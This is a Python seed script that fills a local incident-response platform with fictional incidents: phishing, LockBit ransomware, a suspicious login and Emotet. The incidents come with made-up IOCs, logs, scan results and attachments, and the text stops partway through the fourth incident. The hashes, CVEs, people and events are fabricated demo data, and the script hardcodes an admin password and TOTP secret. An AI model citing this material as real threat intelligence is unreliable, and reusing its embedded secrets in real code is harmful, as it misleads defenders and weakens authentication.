"""
Seed script — 10 realistic incidents with full detail.
Run inside the backend container:
  docker exec -i docker-backend-1 python3 /tmp/seed_data.py
"""
import asyncio
import base64
import io
import json
from datetime import datetime, timedelta, timezone

import httpx
import pyotp

BASE = "http://localhost:8000"
EMAIL = "admin@localhost"
PASSWORD = "ChangeMe123!"
TOTP_SECRET = "JKKPGCNFYJYM2BAFAEGK3R4KX6RJ7LRA"

# ── tiny 1×1 PNG used as fake screenshot attachment ───────────────────────────
TINY_PNG_B64 = (
    "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk"
    "+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg=="
)


async def login(client: httpx.AsyncClient) -> str:
    r = await client.post("/api/v1/auth/login", json={"email": EMAIL, "password": PASSWORD})
    r.raise_for_status()
    body = r.json()
    challenge = body["data"].get("mfa_challenge_token")
    if challenge:
        totp = pyotp.TOTP(TOTP_SECRET).now()
        r2 = await client.post(
            "/api/v1/auth/mfa/verify",
            json={"code": totp},
            headers={"Authorization": f"Bearer {challenge}"},
        )
        r2.raise_for_status()
        return r2.json()["data"]["access_token"]
    return body["data"]["access_token"]


def h(token: str) -> dict:
    return {"Authorization": f"Bearer {token}"}


def dt(days_ago: int, hours: int = 0) -> str:
    t = datetime.now(timezone.utc) - timedelta(days=days_ago, hours=hours)
    return t.isoformat()


async def create_incident(client, token, payload) -> str:
    r = await client.post("/api/v1/incidents", json=payload, headers=h(token))
    r.raise_for_status()
    return r.json()["data"]["id"]


async def patch_incident(client, token, iid, payload):
    r = await client.put(f"/api/v1/incidents/{iid}", json=payload, headers=h(token))
    r.raise_for_status()


async def add_ioc(client, token, iid, payload):
    r = await client.post(f"/api/v1/incidents/{iid}/iocs", json=payload, headers=h(token))
    r.raise_for_status()
    return r.json()["data"]["id"]


async def add_asset(client, token, iid, payload):
    r = await client.post(f"/api/v1/incidents/{iid}/assets", json=payload, headers=h(token))
    r.raise_for_status()
    return r.json()["data"]["id"]


async def add_timeline(client, token, iid, payload):
    r = await client.post(f"/api/v1/incidents/{iid}/timeline", json=payload, headers=h(token))
    r.raise_for_status()
    return r.json()["data"]["id"]


async def add_task(client, token, iid, payload):
    r = await client.post(f"/api/v1/incidents/{iid}/tasks", json=payload, headers=h(token))
    r.raise_for_status()
    return r.json()["data"]["id"]


async def update_task(client, token, iid, tid, payload):
    r = await client.put(f"/api/v1/incidents/{iid}/tasks/{tid}", json=payload, headers=h(token))
    r.raise_for_status()


async def upload_attachment(client, token, iid, filename: str, content: bytes, mime: str):
    files = {"file": (filename, io.BytesIO(content), mime)}
    r = await client.post(
        f"/api/v1/incidents/{iid}/attachments",
        files=files,
        headers=h(token),
    )
    r.raise_for_status()
    return r.json()["data"]["id"]


# ─────────────────────────────────────────────────────────────────────────────
# Fake file helpers
# ─────────────────────────────────────────────────────────────────────────────

def fake_email_headers() -> bytes:
    return (
        "Return-Path: <cfo-update@micro5oft-alerts.com>\n"
        "Received: from mail.micro5oft-alerts.com (203.0.113.45)\n"
        "  by mail.acmecorp.internal; Tue, 14 Jan 2025 08:47:23 +0000\n"
        'From: "Microsoft Security Team" <cfo-update@micro5oft-alerts.com>\n'
        "To: sarah.chen@acmecorp.com\n"
        "Subject: [URGENT] Invoice Q4-2024-92847 - Action Required\n"
        "Date: Tue, 14 Jan 2025 08:47:23 +0000\n"
        "Message-ID: <20250114084723.92847@micro5oft-alerts.com>\n"
        "X-Mailer: PHP/7.4.3\n"
        "Content-Type: text/html; charset=UTF-8\n\n"
        "<html><body>\n"
        "Dear Finance Team Member,<br/>\n"
        "Please review the attached invoice. Click the link below:\n"
        '<a href="https://acme-invoices.micro5oft-alerts.com/view?doc=INV-Q4-92847&token=eyJhbGc">\n'
        "  View Invoice\n</a>\n<br/>\nRegards,<br/>\nMicrosoft Account Team\n</body></html>\n"
    ).encode("utf-8")


def fake_memory_dump_excerpt() -> bytes:
    return (
        "=== Volatility Memory Analysis ===\n"
        "Profile: Win10x64_18362\n"
        "PID: 4892  Name: svchost.exe  (SUSPICIOUS)\n\n"
        "Loaded modules:\n"
        "  0x00007ff8a3b10000  ntdll.dll\n"
        "  0x00007ff8a1c40000  kernel32.dll\n"
        "  0x00007ff870a00000  mscoree.dll  [INJECTED - NOT IN KNOWN MODULES]\n\n"
        "Network connections:\n"
        "  PID 4892 TCP  10.0.1.55:49231  ->  185.220.101.47:443  ESTABLISHED\n"
        "  PID 4892 TCP  10.0.1.55:49232  ->  185.220.101.47:8080  ESTABLISHED\n\n"
        "Registry modifications (HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run):\n"
        '  "WindowsUpdate" = "C:\\Users\\john.smith\\AppData\\Local\\Temp\\svchost32.exe"\n\n'
        "Strings of interest:\n"
        '  AES_KEY = "4a2b8f1c9e3d7f0a"\n'
        '  C2_URL  = "https://updates.windowsupd4te.com/beacon"\n'
        '  MUTEX   = "Global\\\\FE8C2A1B"\n'
    ).encode("utf-8")


def fake_malware_sample() -> bytes:
    return (
        "[FAKE MALWARE SAMPLE - FOR LAB USE ONLY]\n"
        "SHA256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\n"
        "This file simulates the dropped payload observed during the Emotet infection.\n"
        "Original filename: WindowsDefenderUpdate.exe\n"
        "Compiler: MSVC 14.0\n"
        "Packer: UPX 3.96\n"
        "C2 beaconing interval: 600s\n"
        "Capabilities: keylogger, credential stealer, lateral movement via SMB\n"
    ).encode("utf-8")


def fake_network_capture() -> bytes:
    return (
        "=== Wireshark Export (filtered) ===\n"
        "No.  Time        Source           Destination      Protocol  Info\n"
        "1    0.000000    10.0.1.55        185.220.101.47   TLSv1.3   Client Hello\n"
        "2    0.041234    185.220.101.47   10.0.1.55        TLSv1.3   Server Hello\n"
        "3    0.085321    10.0.1.55        185.220.101.47   TLSv1.3   Application Data (408 bytes)\n"
        "4    0.126789    185.220.101.47   10.0.1.55        TLSv1.3   Application Data (1024 bytes)\n"
        "...\n"
        "147  600.003214  10.0.1.55        185.220.101.47   TLSv1.3   Application Data (beacon #2)\n\n"
        "DNS queries (suspicious):\n"
        "  10.0.1.55 -> updates.windowsupd4te.com  (NXDOMAIN first, then resolved)\n"
        "  10.0.1.55 -> beacon.malware-cdn.net  (resolved to 185.220.101.47)\n"
        "  10.0.1.55 -> c2-fallback.onion.lu  (TOR exit node)\n"
    ).encode("utf-8")


def fake_ssh_log() -> bytes:
    return (
        "Jan 22 03:14:01 dmz-web-01 sshd[21045]: Failed password for root from 45.155.205.233 port 51234 ssh2\n"
        "Jan 22 03:14:02 dmz-web-01 sshd[21046]: Failed password for root from 45.155.205.233 port 51235 ssh2\n"
        "Jan 22 03:14:03 dmz-web-01 sshd[21047]: Failed password for root from 45.155.205.233 port 51236 ssh2\n"
        "Jan 22 03:14:04 dmz-web-01 sshd[21048]: Failed password for admin from 45.155.205.233 port 51237 ssh2\n"
        "Jan 22 03:14:05 dmz-web-01 sshd[21049]: Failed password for ubuntu from 45.155.205.233 port 51238 ssh2\n"
        "... [2847 more lines of failed attempts from same IP] ...\n"
        "Jan 22 03:58:12 dmz-web-01 sshd[23892]: Accepted password for deploy from 45.155.205.233 port 51901 ssh2\n"
        "Jan 22 03:58:12 dmz-web-01 sshd[23892]: pam_unix(sshd:session): session opened for user deploy by (uid=0)\n"
        "Jan 22 03:58:14 dmz-web-01 sudo[23894]: deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash\n"
    ).encode("utf-8")


def fake_insider_report() -> bytes:
    return (
        "CONFIDENTIAL - HR & Security Joint Investigation Report\n"
        "Incident Ref: INSIDER-2025-003\n"
        "Date: March 3, 2025\n\n"
        "Subject: John Williams (Engineering Manager, Access Level 4)\n\n"
        "SUMMARY\n-------\n"
        "DLP system flagged bulk export of customer PII from the CRM database\n"
        "on 2025-02-28 between 23:47 and 00:12 UTC. Export size: ~2.3 GB,\n"
        "approximately 850,000 customer records.\n\n"
        "TIMELINE\n--------\n"
        "23:47 - User authenticated via SSO\n"
        "23:49 - Ran SELECT * on customers table\n"
        "23:51 - Exported results to CSV via reporting tool\n"
        "23:54 - Uploaded CSV to personal Dropbox account (flagged by DLP)\n"
        "23:58 - Attempted to DELETE audit_log entries (FAILED - insufficient privs)\n"
        "00:12 - Session terminated\n\n"
        "CONCLUSION\n----------\n"
        "Malicious insider data theft confirmed. HR notified. Law enforcement pending.\n"
        "Access revoked 2025-03-01 00:24 UTC.\n"
    ).encode("utf-8")


def fake_vuln_scan() -> bytes:
    return (
        "=== Nessus Vulnerability Report - Customer Portal ===\n"
        "Scan date: 2025-04-15 09:30 UTC\n"
        "Target: 10.0.2.88 (portal.acmecorp.com)\n\n"
        "CRITICAL: CVE-2025-1337 - Remote Code Execution in PortalCMS 4.2.1\n"
        "  CVSS: 9.8\n"
        "  Description: Unauthenticated RCE via deserialization of user-controlled\n"
        "  input in the file upload handler (/api/v1/upload).\n"
        "  Evidence: Successfully executed 'id' command as www-data.\n\n"
        "HIGH: CVE-2024-44228 (Log4Shell variant) - Remote Code Execution\n"
        "  CVSS: 9.0\n"
        "  Description: JNDI injection via User-Agent header.\n\n"
        "HIGH: CVE-2025-0821 - SQL Injection in search endpoint\n"
        "  CVSS: 8.1\n"
        "  Description: /api/v1/search?q= parameter not sanitised.\n\n"
        "MEDIUM: Outdated OpenSSL 1.1.1n (EOL)\n"
        "MEDIUM: Missing HSTS header\n"
        "LOW: Information disclosure via /phpinfo.php\n"
    ).encode("utf-8")


# ─────────────────────────────────────────────────────────────────────────────
# INCIDENT DEFINITIONS
# ─────────────────────────────────────────────────────────────────────────────

async def seed_incident_1(client, token):
    """Spear Phishing — Finance Team (CLOSED, sev2, 30 days ago)"""
    print("  Creating INC-01: Spear Phishing — Finance Team...")
    iid = await create_incident(client, token, {"title": "Targeted Spear Phishing Campaign Against Finance Team", "severity": "sev2"})

    await patch_incident(client, token, iid, {
        "status": "closed",
        "executive_summary": "<h2>Executive Summary</h2><p>On January 14, 2025, a targeted spear phishing campaign was directed at the Finance department. The attacker used a typosquatted domain mimicking Microsoft to deliver a credential-harvesting page. <strong>3 users clicked the link</strong>; 1 user submitted credentials before the link was blocked. All affected accounts were reset and no financial transfers were initiated.</p>",
        "notes": "<p>Initial alert fired from <strong>ProofPoint</strong> email gateway at 08:52 UTC. The email spoofed a Microsoft invoice notification and contained a link to <code>acme-invoices.micro5oft-alerts.com</code>.</p><p>Threat intel cross-reference: sender IP <code>203.0.113.45</code> matches known phishing-as-a-service infrastructure (Scattered Spider TTPs).</p>",
        "lessons_learned": "<p><strong>What worked:</strong> Email gateway alert fired within 5 minutes. IR team response was swift.</p><p><strong>What didn't:</strong> Three users were not enrolled in phishing simulation training. MFA was not enforced on OWA — one compromised credential was used to access email briefly.</p><p><strong>Actions:</strong> Mandatory phishing awareness training rolled out company-wide. MFA enforced on all external-facing services.</p>",
        "actions_todo": '<ul data-type="taskList"><li data-checked="true"><p>Reset credentials for all 3 affected accounts</p></li><li data-checked="true"><p>Block sender domain and IP at email gateway</p></li><li data-checked="true"><p>Enroll Finance team in phishing simulation</p></li><li data-checked="true"><p>Enforce MFA on OWA and all external portals</p></li></ul>',
    })

    # IOCs
    await add_ioc(client, token, iid, {"ioc_type": "email", "value": "cfo-update@micro5oft-alerts.com", "description": "Sender address — typosquatted Microsoft domain", "confidence": 95, "status": "blocked", "tlp_level": "amber"})
    await add_ioc(client, token, iid, {"ioc_type": "domain", "value": "micro5oft-alerts.com", "description": "Phishing domain (typosquatted microsoft.com)", "confidence": 98, "status": "blocked", "tlp_level": "amber"})
    await add_ioc(client, token, iid, {"ioc_type": "url", "value": "https://acme-invoices.micro5oft-alerts.com/view?doc=INV-Q4-92847", "description": "Credential harvesting landing page", "confidence": 99, "status": "blocked", "tlp_level": "red"})
    await add_ioc(client, token, iid, {"ioc_type": "ip", "value": "203.0.113.45", "description": "Phishing infrastructure — sending MTA", "confidence": 90, "status": "blocked", "tlp_level": "amber"})
    await add_ioc(client, token, iid, {"ioc_type": "hash", "value": "a1b2c3d4e5f6789012345678901234567890abcd", "description": "SHA1 of malicious HTML attachment (Invoice_Q4-2024-92847.html)", "confidence": 97, "status": "blocked", "tlp_level": "red"})

    # Assets
    w1 = await add_asset(client, token, iid, {"asset_type": "workstation", "name": "FINANCE-WS-014", "description": "Sarah Chen's workstation — clicked link, credentials not submitted", "status": "confirmed", "criticality": "medium"})
    w2 = await add_asset(client, token, iid, {"asset_type": "workstation", "name": "FINANCE-WS-007", "description": "Mark Rodriguez's workstation — clicked link and submitted credentials", "status": "confirmed", "criticality": "high"})
    await add_asset(client, token, iid, {"asset_type": "workstation", "name": "FINANCE-WS-021", "description": "Lisa Park's workstation — clicked link, credentials not submitted", "status": "remediated", "criticality": "medium"})
    a1 = await add_asset(client, token, iid, {"asset_type": "email_address", "name": "sarah.chen@acmecorp.com", "description": "Primary target — received phishing email", "status": "remediated", "criticality": "medium"})
    a2 = await add_asset(client, token, iid, {"asset_type": "email_address", "name": "mark.rodriguez@acmecorp.com", "description": "Credentials compromised — password reset performed", "status": "remediated", "criticality": "high"})

    # Timeline
    t1 = await add_timeline(client, token, iid, {"entry_type": "detection", "occurred_at": dt(30, 8), "description": "ProofPoint email gateway flagged 3 messages from micro5oft-alerts.com as phishing. Automatic quarantine triggered. SOC analyst paged.", "source": "proofpoint"})
    t2 = await add_timeline(client, token, iid, {"entry_type": "analysis", "occurred_at": dt(30, 7), "description": "Analyst confirmed phishing campaign. Identified typosquatted domain and harvesting page. Checked URL in VirusTotal — 31/90 engines flagged as phishing.", "source": "manual"})
    t3 = await add_timeline(client, token, iid, {"entry_type": "evidence", "occurred_at": dt(30, 7), "description": "Email headers retrieved and preserved. Sender IP 203.0.113.45 identified as belonging to known phishing-as-a-service platform.", "source": "manual", "is_pinned": True})
    t4 = await add_timeline(client, token, iid, {"entry_type": "analysis", "occurred_at": dt(30, 6), "description": "Reviewed email gateway logs. Confirmed 3 recipients clicked the link. Contacted Mark Rodriguez — he admits submitting his credentials on the landing page.", "source": "manual"})
    t5 = await add_timeline(client, token, iid, {"entry_type": "containment", "occurred_at": dt(30, 5), "description": "Mark Rodriguez's AD password reset and session tokens invalidated. OWA access blocked pending MFA enrolment. Domain blocked at DNS level and email gateway.", "source": "manual"})
    t6 = await add_timeline(client, token, iid, {"entry_type": "comms", "occurred_at": dt(30, 4), "description": "Finance department head notified. All-hands email sent to Finance team warning of phishing campaign. IT Helpdesk briefed on expected call volume.", "source": "manual"})
    await add_timeline(client, token, iid, {"entry_type": "note", "occurred_at": dt(29, 0), "description": "Post-incident review completed. No evidence of further access using compromised credentials. Case closed.", "source": "manual"})

    # Tasks
    task1 = await add_task(client, token, iid, {"title": "Reset credentials for all affected accounts", "priority": "critical", "phase": "containment", "description": "Reset AD passwords and revoke all active sessions for the 3 users who clicked the phishing link."})
    task2 = await add_task(client, token, iid, {"title": "Block phishing domain and sender IP at email gateway", "priority": "high", "phase": "containment"})
    task3 = await add_task(client, token, iid, {"title": "Enroll Finance team in phishing simulation training", "priority": "medium", "phase": "remediation"})
    task4 = await add_task(client, token, iid, {"title": "Enforce MFA on OWA and all external portals", "priority": "high", "phase": "remediation"})
    task5 = await add_task(client, token, iid, {"title": "Submit IOCs to threat intelligence platform", "priority": "low", "phase": "remediation"})

    for tid in [task1, task2, task3, task4, task5]:
        await update_task(client, token, iid, tid, {"status": "done"})

    # Attachments
    await upload_attachment(client, token, iid, "phishing_email_headers.txt", fake_email_headers(), "text/plain")
    await upload_attachment(client, token, iid, "screenshot_landing_page.png", base64.b64decode(TINY_PNG_B64), "image/png")

    print(f"    ✅  INC-01 created (id={iid[:8]})")
    return iid


async def seed_incident_2(client, token):
    """Ransomware — Accounting Server (CONTAINED, sev1, 18 days ago)"""
    print("  Creating INC-02: Ransomware — Accounting Server...")
    iid = await create_incident(client, token, {"title": "LockBit 3.0 Ransomware Infection on Accounting Infrastructure", "severity": "sev1"})

    await patch_incident(client, token, iid, {
        "status": "contained",
        "executive_summary": "<h2>Executive Summary</h2><p>On January 26, 2025, LockBit 3.0 ransomware was deployed across the accounting department's server infrastructure. <strong>2 servers and 7 workstations</strong> were encrypted. The attack vector was a compromised service account credential obtained via a credential-stuffing attack. Network segmentation limited lateral movement to the Finance VLAN. Backups are confirmed intact. Decryption and recovery is 60% complete.</p>",
        "notes": "<p>Initial infection vector: service account <code>svc-accounting-sync</code> credential leaked in a public credential dump (HaveIBeenPwned confirmed breach date Dec 2024).</p><p>Attacker dwell time estimated at <strong>4 days</strong> based on earliest anomalous login (2025-01-22 02:14 UTC). During dwell time, attacker exfiltrated ~40GB of financial records before encrypting.</p><p>Ransom note demanded 85 BTC (~$8.1M USD). Management decision: do not pay — restore from backup.</p>",
        "lessons_learned": "<p><strong>Service account hygiene:</strong> svc-accounting-sync had not rotated its password in 847 days. Implement quarterly rotation for all service accounts.</p><p><strong>Backup validation:</strong> Backups were intact but last validation test was 11 months ago. Monthly backup restore drills required.</p><p><strong>Detection gap:</strong> 4-day dwell time before detection is too long. EDR coverage was missing on 3 of the encrypted workstations.</p>",
        "actions_todo": '<ul data-type="taskList"><li data-checked="true"><p>Isolate encrypted systems from network</p></li><li data-checked="true"><p>Preserve forensic images of encrypted systems</p></li><li data-checked="false"><p>Restore ACCT-SRV-01 from backup (in progress)</p></li><li data-checked="false"><p>Restore ACCT-SRV-02 from backup</p></li><li data-checked="false"><p>Deploy EDR agents to all previously unprotected workstations</p></li><li data-checked="false"><p>Implement service account password rotation policy</p></li></ul>',
    })

    # IOCs
    await add_ioc(client, token, iid, {"ioc_type": "hash", "value": "5e884898da280471451a12a68c4a1e4b35c4b0a2c2db71f5e6f5e16d2c4bb8f1", "description": "SHA256 — LockBit 3.0 encryptor binary (LB3.exe)", "confidence": 99, "status": "blocked", "tlp_level": "red", "tags": ["ransomware", "lockbit3"]})
    await add_ioc(client, token, iid, {"ioc_type": "hash", "value": "7c4f2a9b1e6d83fc5d2c0f9a4b7e1c3d8f2a5b9e1d4f7c2a8b3e5d9f1c4a6b8", "description": "SHA256 — LockBit 3.0 dropper (svchost32.exe, dropped in AppData\\Local\\Temp)", "confidence": 98, "status": "blocked", "tlp_level": "red", "tags": ["ransomware", "dropper"]})
    await add_ioc(client, token, iid, {"ioc_type": "ip", "value": "185.220.101.47", "description": "LockBit C2 server — exfiltration endpoint (confirmed via netflow)", "confidence": 97, "status": "blocked", "tlp_level": "red", "tags": ["c2", "lockbit3"]})
    await add_ioc(client, token, iid, {"ioc_type": "ip", "value": "185.220.101.53", "description": "LockBit C2 server — backup C2", "confidence": 85, "status": "blocked", "tlp_level": "red"})
    await add_ioc(client, token, iid, {"ioc_type": "domain", "value": "lockbit3-decryptor.onion.lu", "description": "Ransom payment portal (clearnet proxy to Tor)", "confidence": 99, "status": "blocked", "tlp_level": "red"})
    await add_ioc(client, token, iid, {"ioc_type": "username", "value": "svc-accounting-sync", "description": "Compromised service account used as initial access vector", "confidence": 100, "status": "remediated", "tlp_level": "amber"})

    # Assets
    await add_asset(client, token, iid, {"asset_type": "server", "name": "ACCT-SRV-01", "description": "Primary accounting server — ENCRYPTED. Running Windows Server 2019, hosts QuickBooks Enterprise and shared drives.", "status": "confirmed", "criticality": "critical", "tags": ["encrypted", "recovery-in-progress"]})
    await add_asset(client, token, iid, {"asset_type": "server", "name": "ACCT-SRV-02", "description": "Secondary accounting server — ENCRYPTED. Hosts financial reporting application.", "status": "confirmed", "criticality": "critical", "tags": ["encrypted"]})
    await add_asset(client, token, iid, {"asset_type": "workstation", "name": "ACCT-WS-001", "description": "CFO's workstation — encrypted", "status": "confirmed", "criticality": "high"})
    await add_asset(client, token, iid, {"asset_type": "workstation", "name": "ACCT-WS-002", "description": "AP Specialist workstation — encrypted", "status": "confirmed", "criticality": "medium"})
    await add_asset(client, token, iid, {"asset_type": "workstation", "name": "ACCT-WS-003", "description": "AR Specialist workstation — encrypted", "status": "confirmed", "criticality": "medium"})
    await add_asset(client, token, iid, {"asset_type": "service_account", "name": "svc-accounting-sync", "description": "Compromised service account — disabled immediately on discovery. Last password change: 847 days prior.", "status": "remediated", "criticality": "critical"})
    await add_asset(client, token, iid, {"asset_type": "network_device", "name": "FIREWALL-CORE-01", "description": "Core firewall — rules reviewed, C2 IPs blocked. No compromise detected.", "status": "cleared", "criticality": "critical"})

    # Timeline
    await add_timeline(client, token, iid, {"entry_type": "note", "occurred_at": dt(22, 2), "description": "Retrospective: svc-accounting-sync first anomalous login from external IP 185.220.101.47. This was the start of attacker dwell time — not detected at the time.", "source": "manual", "is_pinned": True})
    await add_timeline(client, token, iid, {"entry_type": "detection", "occurred_at": dt(18, 6), "description": "EDR (CrowdStrike Falcon) raised critical alert: mass file rename activity detected on ACCT-SRV-01. Files being renamed with .lockbit3 extension. SOC paged immediately.", "source": "crowdstrike"})
    await add_timeline(client, token, iid, {"entry_type": "containment", "occurred_at": dt(18, 5), "description": "Network team immediately isolated Finance VLAN (VLAN 30) from rest of network. ACCT-SRV-01, ACCT-SRV-02 and all ACCT workstations taken offline. svc-accounting-sync account disabled.", "source": "manual"})
    await add_timeline(client, token, iid, {"entry_type": "evidence", "occurred_at": dt(18, 5), "description": "Ransom note found: README-LOCKBIT3.txt on all encrypted file shares. Demands 85 BTC (~$8.1M USD) payable within 72 hours. Note preserved and shared with legal.", "source": "manual", "is_pinned": True})
    await add_timeline(client, token, iid, {"entry_type": "analysis", "occurred_at": dt(18, 4), "description": "Forensic image taken of ACCT-SRV-01 and ACCT-SRV-02. Memory dump acquired from ACCT-WS-001 (CFO workstation). Initial analysis confirms LockBit 3.0 variant.", "source": "manual"})
    await add_timeline(client, token, iid, {"entry_type": "analysis", "occurred_at": dt(17, 8), "description": "Netflow analysis shows ~40GB data transferred to 185.220.101.47 over prior 4 days. Exfiltrated data likely includes Q4 financial reports and payroll data.", "source": "manual"})
    await add_timeline(client, token, iid, {"entry_type": "comms", "occurred_at": dt(17, 6), "description": "Executive leadership briefed. Decision made: do not pay ransom. Legal, external IR firm (Mandiant) and cyber insurance carrier notified. State AG office notification submitted (PII breach).", "source": "manual", "is_pinned": True})
    await add_timeline(client, token, iid, {"entry_type": "containment", "occurred_at": dt(16, 0), "description": "Backup integrity confirmed — last backup 2025-01-25 23:00 UTC is intact and unencrypted. Restoration plan approved. Estimated 5-day recovery timeline.", "source": "manual"})

    # Tasks
    t1 = await add_task(client, token, iid, {"title": "Isolate and forensically image all encrypted systems", "priority": "critical", "phase": "containment"})
    t2 = await add_task(client, token, iid, {"title": "Disable and rotate all service account credentials", "priority": "critical", "phase": "containment"})
    t3 = await add_task(client, token, iid, {"title": "Restore ACCT-SRV-01 from backup", "priority": "critical", "phase": "remediation", "description": "Restore from backup taken 2025-01-25 23:00 UTC. Validate data integrity post-restore."})
    t4 = await add_task(client, token, iid, {"title": "Restore ACCT-SRV-02 from backup", "priority": "critical", "phase": "remediation"})
    t5 = await add_task(client, token, iid, {"title": "Deploy EDR to all unprotected endpoints", "priority": "high", "phase": "remediation"})
    t6 = await add_task(client, token, iid, {"title": "Submit ransom note and malware samples to law enforcement", "priority": "medium", "phase": "remediation"})
    t7 = await add_task(client, token, iid, {"title": "Notify affected individuals per breach notification requirements", "priority": "high", "phase": "remediation"})

    await update_task(client, token, iid, t1, {"status": "done"})
    await update_task(client, token, iid, t2, {"status": "done"})
    await update_task(client, token, iid, t3, {"status": "in_progress"})
    await update_task(client, token, iid, t4, {"status": "pending"})
    await update_task(client, token, iid, t5, {"status": "pending"})
    await update_task(client, token, iid, t6, {"status": "done"})
    await update_task(client, token, iid, t7, {"status": "in_progress"})

    # Attachments
    await upload_attachment(client, token, iid, "memory_dump_analysis.txt", fake_memory_dump_excerpt(), "text/plain")
    await upload_attachment(client, token, iid, "network_capture_analysis.txt", fake_network_capture(), "text/plain")
    await upload_attachment(client, token, iid, "lockbit3_sample_lab_only.txt", fake_malware_sample(), "text/plain")
    await upload_attachment(client, token, iid, "ransom_note_screenshot.png", base64.b64decode(TINY_PNG_B64), "image/png")

    print(f"    ✅  INC-02 created (id={iid[:8]})")
    return iid


async def seed_incident_3(client, token):
    """Suspicious Login — Nigeria (MONITORING, sev3, 10 days ago)"""
    print("  Creating INC-03: Suspicious Login from Unusual Location...")
    iid = await create_incident(client, token, {"title": "Suspicious Admin Login from Unusual Geography (Nigeria)", "severity": "sev3"})

    await patch_incident(client, token, iid, {
        "status": "monitoring",
        "executive_summary": "<p>On February 3, 2025, our SIEM flagged an admin account login from Lagos, Nigeria — an unusual location for this user who is based in Chicago. MFA was used, suggesting possible session token theft or SIM-swap. The user confirmed they did not initiate the login. The session was terminated and credentials reset. Monitoring continues for further anomalous activity.</p>",
        "notes": "<p>User: <strong>james.hartley@acmecorp.com</strong> (Director of Engineering, admin privileges on AWS and GitHub).<br/>Impossible travel: User's previous login was from Chicago (IP 173.194.x.x) 2 hours prior — physically impossible travel distance.<br/>Login used valid MFA code — investigating whether SIM-swap or authenticator app theft is involved. Telecom provider contacted.</p>",
    })

    await add_ioc(client, token, iid, {"ioc_type": "ip", "value": "196.216.242.15", "description": "Source IP of suspicious login — geolocation: Lagos, Nigeria (MTN Nigeria ASN)", "confidence": 85, "status": "active", "tlp_level": "amber"})
    await add_ioc(client, token, iid, {"ioc_type": "username", "value": "james.hartley@acmecorp.com", "description": "Compromised admin account — forced re-enrollment of MFA", "confidence": 90, "status": "remediated", "tlp_level": "amber"})

    await add_asset(client, token, iid, {"asset_type": "account", "name": "james.hartley@acmecorp.com", "description": "Director of Engineering — admin access to AWS, GitHub, Okta", "status": "remediated", "criticality": "critical"})
    await add_asset(client, token, iid, {"asset_type": "service_account", "name": "AWS-Admin (us-east-1)", "description": "AWS admin role accessible by the compromised account", "status": "suspected", "criticality": "critical"})
    await add_asset(client, token, iid, {"asset_type": "application", "name": "GitHub Enterprise", "description": "Source code repository — admin access held by compromised account", "status": "suspected", "criticality": "high"})

    await add_timeline(client, token, iid, {"entry_type": "detection", "occurred_at": dt(10, 3), "description": "Okta ThreatInsight and SIEM rule 'Impossible Travel' fired. Login from Lagos, Nigeria 2h after Chicago login. UEBA score: 94/100.", "source": "okta"})
    await add_timeline(client, token, iid, {"entry_type": "containment", "occurred_at": dt(10, 2), "description": "Active session from 196.216.242.15 terminated via Okta admin console. User notified via phone (secondary channel). All sessions invalidated.", "source": "manual"})
    await add_timeline(client, token, iid, {"entry_type": "analysis", "occurred_at": dt(10, 1), "description": "User confirms no travel and did not initiate login. MFA used was TOTP app — investigating SIM-swap or mobile device compromise. No actions observed in the 4-minute active session (AWS API calls: 0, GitHub pushes: 0).", "source": "manual"})
    await add_timeline(client, token, iid, {"entry_type": "note", "occurred_at": dt(9, 0), "description": "Carrier confirmed no SIM-swap in the past 30 days. Hypothesis: TOTP seed compromised (possible mobile malware). Scheduling MDM scan of user's mobile device.", "source": "manual"})

    task1 = await add_task(client, token, iid, {"title": "Conduct MDM scan of James Hartley's mobile device", "priority": "high", "phase": "analysis"})
    task2 = await add_task(client, token, iid, {"title": "Audit all AWS API calls during the 4-minute session window", "priority": "high", "phase": "analysis"})
    task3 = await add_task(client, token, iid, {"title": "Review GitHub audit log for any access during session", "priority": "medium", "phase": "analysis"})
    task4 = await add_task(client, token, iid, {"title": "Rotate all API keys associated with compromised account", "priority": "critical", "phase": "containment"})

    await update_task(client, token, iid, task4, {"status": "done"})
    await update_task(client, token, iid, task1, {"status": "in_progress"})

    print(f"    ✅  INC-03 created (id={iid[:8]})")
    return iid


async def seed_incident_4(client, token):
    """Emotet Malware Infection (CLOSED, sev1, 45 days ago)"""
    print("  Creating INC-04: Emotet Malware Infection...")
    iid = await create_incident(client, token, {"title": "Emotet Malware Campaign — HR Department Infection", "severity": "sev1"})

    await patch_incident(client, token, iid, {
        "status": "closed",
        "executive_summary": "<h2>Executive Summary</h2><p>Emotet malware infected 4 workstations in the HR department after an employee opened a malicious Word document attached to a fake job application email. The malware established persistence, harvested credentials, and attempted to spread via SMB. Prompt detection (18 minutes) and containment prevented further spread. No data exfiltration confirmed.</p>",
        "notes": "<p>Infection vector: Word document with VBA macro (<em>Job_Application_James_Wilson.docm</em>). Document opened by HR Generalist at 10:23 UTC. Macro downloaded Emotet stage-2 payload from <code>updates.windowsupd4te.com</code>.</p><p>Lateral movement attempted via EternalBlue (MS17-010) to adjacent workstations. 3 additional machines in HR subnet were infected before network isolation.</p>",
        "lessons_learned": "<p>Macro execution policies were not enforced in Group Policy — Word allowed all macros. GPO now configured to block all macros from internet-sourced files. Patch compliance: 3 of 4 infected machines were missing MS17-010 patch despite being on WSUS. WSUS compliance reporting now mandatory.</p>",
        "actions_todo": '<ul data-type="taskList"><li data-checked="true"><p>Re-image all 4 infected workstations</p></li><li data-checked="true"><p>Apply MS17-010 patch to all remaining unpatched endpoints</p></li><li data-checked="true"><p>Configure GPO to block macro execution from internet sources</p></li><li data-checked="true"><p>Reset credentials for all accounts active on infected machines</p></li><li data-checked="true"><p>Submit malware samples to AV vendor and threat intel platform</p></li></ul>',
    })

    await add_ioc(client, token, iid, {"ioc_type": "hash", "value": "f3a1b9c2d4e5067891011121314151617181920212223242526272829303132", "description": "SHA256 — Emotet Word dropper (Job_Application_James_Wilson.docm)", "confidence": 99, "status": "blocked", "tlp_level": "red", "tags": ["emotet", "maldoc"]})
    await add_ioc(client, token, iid, {"ioc_type": "hash", "value": "a9b8c7d6e5f4031211100f0e0d0c0b0a09080706050403020100ffeeddccbbaa", "description": "SHA256 — Emotet stage-2 payload (WindowsDefenderUpdate.exe)", "confidence": 99, "status": "blocked", "tlp_level": "red", "tags": ["emotet", "payload"]})
